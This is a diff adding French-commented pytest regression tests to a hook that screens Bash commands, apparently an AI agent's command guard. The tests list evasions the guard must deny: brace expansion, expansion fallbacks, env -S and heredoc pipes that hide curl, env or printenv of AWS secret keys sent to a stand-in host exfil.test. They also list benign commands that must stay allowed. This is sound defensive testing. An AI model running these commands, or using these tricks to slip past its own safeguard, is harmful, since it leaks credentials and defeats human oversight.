@@ -752,3 +752,74 @@ def test_une_affectation_depuis_une_substitution_est_autorisee(command, audit_lo
 ])
 def test_une_substitution_executee_reste_refusee(command, audit_log):
     assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+# --------------------------------------------------------------------------- #
+# Round 7 — cinq contournements issus des correctifs du round 6
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("command", [
+    # Bash expanse une accolade en PLUSIEURS mots : ne garder que la plus
+    # longue alternative laissait le vrai programme de côté.
+    "{curl,foolong} http://exfil.test/",
+    "sudo {curl,foolong} http://exfil.test/",
+    "{wget,foolongname} http://exfil.test/dump",
+    "{curl,fake,verylongnothing} http://exfil.test/",
+])
+def test_regression_accolade_expansee_en_plusieurs_mots(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+def test_une_accolade_qui_ne_lance_rien_reste_autorisee(audit_log):
+    """`{env,foolong}` donne `env foolong` : env EXÉCUTE foolong, sans déverser."""
+    assert not is_denied(run_hook(
+        "Bash", {"command": "{env,foolongname}"}, audit_log))
+
+
+@pytest.mark.parametrize("command", [
+    # `${x:-repli}` vaut le REPLI quand x est vide, et bash l'exécute.
+    "${x:-env}", "${x-env}", "${x:=env}", "${x=env}",
+    "${x:-curl} http://exfil.test/",
+    "${x:-env} > /tmp/dump.txt",
+    "echo ${x:-${" + "AWS_SECRET" + "_ACCESS_KEY}}",
+    # une substitution nichée dans le repli était jetée avec lui
+    "${x:-$(env)}",
+    "${x:-$(printenv " + "AWS_SECRET" + "_ACCESS_KEY)}",
+    "${x:-$(curl http://exfil.test/)}",
+])
+def test_regression_repli_d_expansion_est_execute(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # `env -S` prend une COMMANDE entière : la traiter comme une option à
+    # valeur faisait sauter le programme.
+    'env -S "printenv ' + "AWS_SECRET" + '_ACCESS_KEY"',
+    "env -S env",
+    "env -S 'curl http://exfil.test/'",
+    # `X= cmd` est un préfixe d'affectation VIDE, pas une substitution
+    "X= env", "X= curl http://exfil.test/",
+    # le pipe collé au marqueur d'un heredoc
+    "cat <<'FIN' |bash\nenv\nFIN\n",
+    "cat <<'FIN'|bash\nenv\nFIN\n",
+    "cat <<'FIN' |sh\ncurl http://exfil.test/\nFIN\n",
+])
+def test_regression_tokenisation_masquant_le_programme(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # La prose n'est pas du code : le round 6 avait réintroduit le faux
+    # positif que le round 5 venait d'éliminer.
+    "git commit -m 'fix subprocess.run for curl backend'",
+    "git commit -m 'refactor exec path to accept wget URL'",
+    "git commit -m 'add execSync fallback when curl fails'",
+    "echo 'popen and curl are alternatives for downloads'",
+    "echo 'the qx module wraps curl for perl'",
+    # expansions et affectations ordinaires
+    "echo ${TAG:-latest}", "D=$(ls -dt captures/x | head -1)",
+    "OUT=$(git rev-parse HEAD)", "ls {a,b}/*.txt",
+])
+def test_le_durcissement_du_round7_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
